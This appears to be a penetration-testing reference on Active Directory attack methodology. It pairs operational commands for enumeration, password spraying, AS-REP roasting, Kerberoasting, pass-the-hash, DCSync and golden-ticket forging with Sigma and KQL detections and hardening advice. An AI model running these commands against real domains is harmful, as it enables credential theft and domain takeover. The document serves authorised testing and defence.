# Active Directory Enumeration & Attack Methodology

Hub document for Active Directory attacks: the kill-chain, enumeration tooling, SID/ACL primer, and a map to the deep-dive files in this directory. Grounded in current (2025-2026) tradecraft.

Deep-dive companions in this folder:
- `kerberos-attacks.md` — Kerberoasting, AS-REP roasting, PtT, overpass-the-hash, Golden/Silver/Diamond/Sapphire tickets, delegation (unconstrained/constrained/RBCD), shadow credentials.
- `adcs-esc-attacks.md` — AD CS / Certipy ESC1–ESC16.
- `acl-abuse-and-dacl.md` — GenericAll/Write, WriteDACL, WriteOwner, AddSelf, GPO abuse, DCSync rights.
- `bloodhound-and-recon.md` — BloodHound CE, SharpHound/azurehound, Cypher queries, PowerView/AD module recon.
- `ntlm-relay-and-coercion.md` — Responder, mitm6, coercion (PetitPotam/PrinterBug/DFSCoerce), ntlmrelayx targets.

See also `05-privilege-escalation/windows/impacket-reference.md` and `07-password-attacks/windows-hashes/windows-hash-attacks.md`.

---

## 0. The AD Kill-Chain (mental model)

```
 No creds                     Any domain creds                Privileged / DA
 ────────                     ────────────────                ───────────────
 anon LDAP / RID cycle   →    BloodHound recon           →    DCSync (krbtgt)
 AS-REP roast (no auth)  →    Kerberoast (SPNs)          →    Golden ticket
 NTLM poison/relay       →    ACL abuse / shadow creds   →    Domain persistence
 LLMNR/NBNS spoof        →    delegation abuse (RBCD)    →    cross-trust / forest
 password spray          →    ADCS ESC1-16 → cert→TGT    →    Enterprise Admin
```

**Operating loop:** enumerate → find a path (usually via BloodHound) → take the cheapest hop → re-enumerate as the new principal → repeat until DA/EA. Re-run SharpHound after each compromise and **mark owned** in BloodHound.

---

## 1. Initial Access (no/low creds)

```bash
# Connect to a host (RDP/WinRM)
xfreerdp /u:user /d:domain /p:pass /v:<ip> /dynamic-resolution +clipboard
evil-winrm -i <ip> -u user -p pass
evil-winrm -i <ip> -u user -H <NTLM_HASH>        # pass-the-hash over WinRM

# Anonymous / null enumeration
nxc smb <DC_IP> -u '' -p ''                       # null session
nxc smb <DC_IP> -u guest -p ''
enum4linux-ng -A <DC_IP>
rpcclient -U "" -N <DC_IP> -c "enumdomusers;querydominfo"
ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts   # anonymous LDAP base

# RID cycling to build a user list with no creds
nxc smb <DC_IP> -u guest -p '' --rid-brute
impacket-lookupsid DOMAIN/guest@<DC_IP>

# User enumeration via Kerberos (no creds, no lockout) → seed roasting/spraying
kerbrute userenum -d domain.local --dc <DC_IP> users.txt
```

### Get an initial credential
```bash
# AS-REP roast accounts with pre-auth disabled (no creds needed) — see kerberos-attacks.md
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
nxc ldap <DC_IP> -u user -p pass --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Password spray (mind lockout policy: nxc shows badPwdCount/lockoutThreshold)
nxc smb <DC_IP> -u users.txt -p 'Spring2026!' --continue-on-success
kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Spring2026!'

# Poison + relay on the wire — see ntlm-relay-and-coercion.md
sudo responder -I eth0
```

---

## 2. Authenticated Enumeration

### 2.1 NetExec (nxc) — the swiss army knife
```bash
# SMB landscape: hosts, signing, OS, domain
nxc smb <range> -u user -p pass
nxc smb <range> -u user -p pass --gen-relay-list relay_targets.txt   # signing:False hosts
nxc smb <DC_IP> -u user -p pass --users --groups --pass-pol --shares
nxc smb <DC_IP> -u user -p pass --loggedon-users --sessions
nxc smb <range> -u user -p pass --shares -M spider_plus             # crawl shares for secrets

# LDAP recon
nxc ldap <DC_IP> -u user -p pass --kerberoasting kerb.txt
nxc ldap <DC_IP> -u user -p pass --asreproast asrep.txt
nxc ldap <DC_IP> -u user -p pass --find-delegation
nxc ldap <DC_IP> -u user -p pass --trusted-for-delegation --admin-count
nxc ldap <DC_IP> -u user -p pass -M maq                              # MachineAccountQuota
nxc ldap <DC_IP> -u user -p pass -M adcs                            # find AD CS / templates
nxc ldap <DC_IP> -u user -p pass -M laps                            # read LAPS if permitted
nxc ldap <DC_IP> -u user -p pass --bloodhound --collection all --dns-server <DC_IP>

# Validate creds & find where you're local admin (Pwn3d!)
nxc smb <range> -u user -p pass            # "(Pwn3d!)" = local admin there
nxc smb <range> -u user -H <NThash>        # pass-the-hash sweep
nxc winrm <range> -u user -p pass
nxc mssql <ip>  -u user -p pass --local-auth -q 'SELECT @@version'
```

### 2.2 BloodHound collection (do this early — see bloodhound-and-recon.md)
```bash
# Remote, from Linux (no agent on host)
bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All --zip
nxc ldap <DC_IP> -u user -p pass --bloodhound --collection all
```
```powershell
# On a domain host
.\SharpHound.exe -c All --zipfilename loot.zip
```

### 2.3 PowerView / AD module (on-host)
```powershell
Import-Module .\PowerView.ps1
Get-Domain; Get-DomainController; Get-DomainPolicy
Get-DomainUser -SPN | select samaccountname,serviceprincipalname        # kerberoastable
Get-DomainUser -PreauthNotRequired                                       # AS-REP roastable
Get-DomainComputer -Unconstrained                                        # unconstrained delegation
Get-DomainComputer -TrustedToAuth                                        # constrained delegation
Find-LocalAdminAccess                                                    # where am I admin?
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq "$env:USERNAME"}
Get-DomainTrust; Get-ForestTrust                                         # trusts/forest
Find-DomainShare -CheckShareAccess
```

---

## 3. Privilege Escalation Paths (where to go next)

| You found... | Go to |
|--------------|-------|
| Account with SPN | **Kerberoast** → crack → reuse (`kerberos-attacks.md`) |
| Account with pre-auth disabled | **AS-REP roast** → crack (`kerberos-attacks.md`) |
| GenericAll/WriteDACL/WriteOwner/ForceChangePassword on object | **ACL abuse** (`acl-abuse-and-dacl.md`) |
| GenericWrite on a user/computer | **Shadow Credentials** or targeted Kerberoast (`kerberos-attacks.md`) |
| Unconstrained/constrained/RBCD delegation | **Delegation abuse** (`kerberos-attacks.md`) |
| AD CS / vulnerable cert template | **ESC1-16** → cert → TGT (`adcs-esc-attacks.md`) |
| SMB signing off + coercion possible | **NTLM relay** (`ntlm-relay-and-coercion.md`) |
| Local admin on a host | dump LSASS/SAM → PtH sweep → re-enumerate |
| DCSync rights (Get-Changes-All) | `secretsdump -just-dc` → krbtgt → golden ticket |
| LAPS read rights | read local admin pw → lateral |
| GPP `cpassword` in SYSVOL | `gpp-decrypt` (legacy) |

---

## 4. Domain Dominance & Persistence

```bash
# Once DA-equivalent: dump everything
impacket-secretsdump DOMAIN/da:pass@<DC_IP> -just-dc -outputfile dc

# krbtgt hash → Golden Ticket (see kerberos-attacks.md)
impacket-secretsdump DOMAIN/da:pass@<DC_IP> -just-dc-user krbtgt

# Skeleton key / DSRM / AdminSDHolder / silver tickets = stealthier persistence (kerberos-attacks.md)
```
Lateral execution (see impacket-reference.md): `psexec`/`wmiexec`/`smbexec`/`atexec`/`dcomexec`, evil-winrm, or `nxc <proto> -x/-X`.

---

## 5. SID, RID & ACL Primer

### SID structure
```
S-R-I-S1-S2-S3-...-RID
 R  = revision (1)         I  = authority (5 = NT Authority)
 S1-S3 = domain identifier  RID = relative id (unique per principal)
```
### Well-known RIDs
| RID | Principal | RID | Principal |
|-----|-----------|-----|-----------|
| 500 | Administrator | 516 | Domain Controllers |
| 501 | Guest | 518 | Schema Admins |
| 502 | krbtgt | 519 | Enterprise Admins |
| 512 | Domain Admins | 520 | Group Policy Creator Owners |
| 513 | Domain Users | 525 | Protected Users |
| 515 | Domain Computers | 526/527 | Key/Enterprise Key Admins |

### Resolve names/SIDs
```powershell
Convert-NameToSid DOMAIN\user      # PowerView
Convert-SidToName <SID>
```
```bash
impacket-lookupsid DOMAIN/user:pass@<DC_IP>
```

### Dangerous ACL rights (full detail in acl-abuse-and-dacl.md)
| Right | Abuse |
|-------|-------|
| GenericAll | full control (reset pw, add to group, shadow creds, RBCD) |
| GenericWrite / WriteProperty | set SPN (targeted kerberoast), set msDS-KeyCredentialLink (shadow creds), set RBCD |
| WriteDACL | grant yourself GenericAll / DCSync rights |
| WriteOwner | take ownership → grant rights |
| ForceChangePassword / User-Force-Change-Password | reset target's password |
| AllExtendedRights | password reset, DCSync (on domain object) |
| Self / AddSelf | add self to a group |
| DS-Replication-Get-Changes(-All) | **DCSync** |

---

## 6. Quick Reference

```bash
# RECON (no creds)
kerbrute userenum -d dom --dc <DC> users.txt
nxc smb <DC> -u guest -p '' --rid-brute
impacket-GetNPUsers dom/ -usersfile users.txt -no-pass -format hashcat -o asrep.txt

# RECON (creds)
nxc ldap <DC> -u u -p p --kerberoasting k.txt --asreproast a.txt --find-delegation
bloodhound-python -u u -p p -d dom -ns <DC> -c All --zip

# ROAST + CRACK
impacket-GetUserSPNs dom/u:p -dc-ip <DC> -request -outputfile k.txt
hashcat -m 13100 k.txt rockyou.txt        # kerberoast
hashcat -m 18200 a.txt rockyou.txt        # as-rep

# WHERE AM I ADMIN / PtH
nxc smb <range> -u u -H <NThash>          # (Pwn3d!)

# DCSYNC / GOLDEN
impacket-secretsdump dom/u:p@<DC> -just-dc-user krbtgt
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain dom Administrator
```

---

## Detection & Mitigation

> Blue-team companion to the kill-chain above. This file covers the full AD attack methodology — anonymous/null enumeration, RID cycling, Kerberos user-enum, AS-REP roasting, password spraying, authenticated LDAP/SMB recon (NetExec/PowerView), BloodHound collection, and domain-dominance/DCSync. Detection here emphasizes the **enumeration and initial-access phases** that precede the deep-dive techniques in the companion files; ACL-, Kerberos-, ADCS-, and relay-specific detections live in their respective files.

### Telemetry & Log Sources

- **Authentication telemetry**: **4768** (Kerberos TGT requested — AS-REQ), **4769** (service ticket — TGS, the kerberoast signal), **4771** (Kerberos pre-auth failed — spray/enum signal), **4625** (NTLM/interactive logon failure — spray), **4624** (successful logon, with `LogonType` 3=network), **4776** (NTLM credential validation on DC). Failure-code fields (`0x18` bad password, `0x6` no such user, `0x12` disabled/locked) distinguish user-enumeration from password-spraying.
- **Account lockout / bad-password tracking**: **4740** (account locked out), and `badPwdCount`/`lockoutTime` movement across the DC fleet — spray hits many accounts with few attempts each, so per-account counts look benign; the *fleet-wide* pattern is the tell.
- **LDAP query logging**: enable the **"Field Engineering" diagnostic** (`HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics → 15 Field Engineering = 5`) to emit **Event 1644** (expensive/inefficient/slow LDAP searches) — surfaces the broad `(objectClass=*)` / `(samAccountType=...)` sweeps that SharpHound, ldapdomaindump, windapsearch and `nxc ldap` generate. Microsoft Defender for Identity captures LDAP recon without this registry change.
- **Directory Service Access — 4662**: object-access auditing on AD objects; combined with SACLs, surfaces mass property reads consistent with collection.
- **SMB / share enumeration**: **5140/5145** (network share accessed / detailed file-share access), **5142-5145** for share spidering; useful against `--shares`/`spider_plus` style crawls. **SMB null/anonymous session** attempts also show as 4624/4625 LogonType 3 with anonymous/guest.
- **RPC / SAMR enumeration**: **4661** (handle to SAM object) and Defender for Identity "Security principal reconnaissance (LDAP)" / "User and Group membership reconnaissance (SAMR)" alerts catch `enumdomusers`, `--rid-brute`, and `lookupsid`.
- **DNS / network**: zone-transfer attempts, and the AD DNS query volume from a single recon host. NetFlow/Zeek can flag a workstation suddenly opening LDAP/389, GC/3268, SMB/445, Kerberos/88 to the whole subnet.
- **Microsoft Defender for Identity (MDI) / ATA**: behavioral detections for reconnaissance (SAMR/LDAP/DNS), password spray, AS-REP roast, and lateral movement — derived from DC network traffic.
- **Honeytoken accounts**: a decoy user/SPN with no legitimate use — any 4768/4769/4625 referencing it is high-fidelity.

### Detection Logic

Behavioral patterns to alert on:
- **Password spray**: many distinct `TargetUserName` values with `4771`/`4625`/`4776` failures from a single source IP/host within a short window, low attempts-per-account (stays under lockout). Add `4768` failures with code `0x18`.
- **Kerberos user enumeration** (kerbrute userenum): bursts of `4768` with failure code `0x6` (`KDC_ERR_C_PRINCIPAL_UNKNOWN`) — valid users return a different code, so the attacker is mapping the namespace without authenticating.
- **AS-REP roastable harvest**: `4768` for accounts with `Pre-Authentication Type = 0` (no pre-auth), especially many at once / from one host.
- **RID cycling / SAMR enumeration**: rapid sequential SID lookups (4661/4662) or MDI SAMR-recon alert from a non-admin host.
- **Mass LDAP enumeration (BloodHound/ldapdomaindump)**: spikes of Event **1644** or a single principal issuing thousands of LDAP searches with broad filters in minutes — see the dedicated SharpHound detection in `bloodhound-and-recon.md`.
- **Recon from a non-admin / unusual host**: PowerView/AD-module style queries (broad LDAP, `Get-NetSession`, share enumeration) originating from a standard workstation rather than a management/PAW host.
- **DCSync / domain dominance**: replication access (4662 replication GUIDs) from a non-DC — covered in depth in `acl-abuse-and-dacl.md`.
- **Honeytoken touch**: any authentication or query referencing a decoy principal.

```yaml
title: Kerberos Password Spray (Many Accounts, Few Attempts, One Source)
id: 7c2a91de-4f30-49b8-b6c1-2a9e5d3f1c08
status: experimental
description: Detects password spraying via a high count of distinct target accounts experiencing Kerberos pre-auth / NTLM logon failures from a single source in a short window — the spray signature in the initial-access phase.
logsource:
  product: windows
  service: security
detection:
  selection_krb:
    EventID: 4771
    Status: '0x18'        # KDC_ERR_PREAUTH_FAILED (bad password)
  selection_ntlm:
    EventID:
      - 4625
      - 4776
  condition: selection_krb or selection_ntlm
  timeframe: 10m
fields:
  - IpAddress
  - TargetUserName
  - Workstation
falsepositives:
  - Misconfigured service with stale credentials hammering many accounts
  - Vulnerability scanners / authenticated scanners
level: high
tags:
  - attack.credential-access
  - attack.t1110.003
```

```yaml
title: Kerberos User Enumeration (kerbrute-style PRINCIPAL_UNKNOWN burst)
id: b1d4e7a2-6c09-4f51-9d3a-8e0c2b5a7f14
status: experimental
description: Detects username enumeration over Kerberos — a burst of AS-REQ failures with KDC_ERR_C_PRINCIPAL_UNKNOWN, indicating an attacker mapping valid usernames without authenticating.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    Status: '0x6'        # KDC_ERR_C_PRINCIPAL_UNKNOWN
  condition: selection | count(TargetUserName) by IpAddress > 20
  timeframe: 5m
fields:
  - IpAddress
  - TargetUserName
falsepositives:
  - Typos at scale / a broken SSO integration referencing non-existent principals
level: medium
tags:
  - attack.reconnaissance
  - attack.t1087.002
```

```yaml
title: AS-REP Roastable Account Harvest (No-Preauth TGT Requests)
id: e5f0c813-2a47-4b6d-9c1e-4d7a9b2c6e30
status: experimental
description: Detects AS-REP roasting reconnaissance — Kerberos AS-REQ for accounts with pre-authentication disabled, especially many distinct accounts from one source.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'     # pre-authentication not required
  condition: selection | count(TargetUserName) by IpAddress > 3
  timeframe: 10m
fields:
  - IpAddress
  - TargetUserName
  - TicketEncryptionType
falsepositives:
  - Legacy apps/accounts legitimately configured without pre-auth (baseline and allowlist them)
level: medium
tags:
  - attack.credential-access
  - attack.t1558.004
```

KQL (Defender for Identity / Sentinel — SAMR / LDAP reconnaissance from a single actor):

```kql
IdentityDirectoryEvents
| where ActionType in ("LDAP query", "SAMR enumeration", "Account enumeration reconnaissance")
| summarize Queries=count(), Targets=dcount(TargetAccountUpn) by AccountUpn, DeviceName, bin(Timestamp, 5m)
| where Queries > 200 or Targets > 100
| project Timestamp, AccountUpn, DeviceName, Queries, Targets
```

Splunk SPL (fleet-wide password spray — distinct targets per source):

```spl
index=wineventlog (EventCode=4771 Status=0x18) OR (EventCode=4776 Keywords="Audit Failure")
| bucket _time span=10m
| stats dc(TargetUserName) as targeted_accounts values(TargetUserName) as accounts by _time, IpAddress
| where targeted_accounts >= 15
```

### Hardening & Mitigations

- **Disable anonymous/null LDAP & SMB**: set `dSHeuristics` to deny anonymous LDAP ops; restrict `RestrictAnonymous`/`RestrictAnonymousSAM`; disable the **Guest** account; block null sessions. Kills RID cycling, `enum4linux`, anonymous `ldapsearch`, and SAMR enumeration. (Counters **T1087 / T1069**.)
- **Strong lockout & spray-resistant policy**: smart lockout / fine-grained password policies, banned-password lists (Entra Password Protection on-prem agent), and MFA for any externally-reachable auth surface. Monitor fleet-wide `badPwdCount`. (Counters **T1110.003**.)
- **Eliminate AS-REP roastable accounts**: require Kerberos pre-authentication for all accounts (audit `DoesNotRequirePreAuth`); strong/randomized passwords for any that must keep it. (Counters **T1558.004**.)
- **Enable LDAP recon visibility**: turn on Field Engineering diagnostics (1644) or deploy Defender for Identity; baseline normal LDAP query volume per host so SharpHound-style sweeps stand out.
- **Tiered admin model & PAWs**: admin/recon tooling should originate only from Privileged Access Workstations; recon from a standard workstation is itself a signal. (D3FEND: Privileged Account Management.)
- **Network segmentation**: restrict which hosts can reach DC LDAP/389, GC/3268, SMB/445, Kerberos/88 broadly; a workstation fan-scanning these ports is anomalous. (Counters **T1018 / T1046**.)
- **Honeytoken accounts & decoy SPNs**: deploy via MDI honeytokens; any auth/query against them is high-confidence malicious.
- **Reduce trust-attack surface**: enable SID Filtering on trusts, audit `Get-DomainTrust`/`Get-ForestTrust` results, and minimize over-permissive cross-domain/forest trusts. (Counters **T1482 — Domain Trust Discovery**.)
- **Restrict domain dominance primitives**: replication rights only to DCs + Entra Connect; protect `krbtgt` (rotate twice on compromise); Protected Users for Tier-0. (Counters **T1003.006**.)
- **SMB hygiene**: enforce SMB signing (also denies relay — see `ntlm-relay-and-coercion.md`) and remove over-shared SYSVOL/share access that spidering preys on.

### MITRE ATT&CK Mapping

| Technique | ID | Detection / Mitigation note |
|-----------|-----|------------------------------|
| Account Discovery: Domain Account | T1087.002 | Alert on RID cycling / SAMR / Kerberos user-enum bursts; disable null sessions |
| Permission Groups Discovery: Domain Groups | T1069.002 | LDAP recon (1644)/MDI alerts; restrict anonymous group enumeration |
| Domain Trust Discovery | T1482 | Audit trust enumeration; SID filtering; minimize trusts |
| Remote System Discovery | T1018 | Network segmentation + Zeek/NetFlow on DC-port fan-out from one host |
| Network Service Discovery | T1046 | Alert on broad LDAP/SMB/Kerberos port scans from workstations |
| Brute Force: Password Spraying | T1110.003 | Fleet-wide 4771/4776 failures from one source; smart lockout + MFA |
| Steal/Forge Tickets: AS-REP Roasting | T1558.004 | 4768 with PreAuthType 0; require Kerberos pre-auth on all accounts |
| Steal/Forge Tickets: Kerberoasting | T1558.003 | 4769 anomalies (RC4/many SPNs); see `kerberos-attacks.md` |
| OS Credential Dumping: DCSync | T1003.006 | 4662 replication GUIDs from non-DC; restrict replication; Defender for Identity |
| Valid Accounts: Domain Accounts | T1078.002 | Tiered admin, PAWs, JIT/PAM; recon from non-PAW host as a signal |

---

## References

- The Hacker Recipes – Active Directory — https://www.thehacker.recipes/ad/
- HackTricks – Active Directory Methodology — https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- BloodHound CE docs — https://bloodhound.specterops.io/
- NetExec wiki — https://www.netexec.wiki/
- PowerView (PowerSploit/dev) — https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
- kerbrute — https://github.com/ropnop/kerbrute
- Orange Cyberdefense AD mindmap — https://orange-cyberdefense.github.io/ocd-mindmaps/
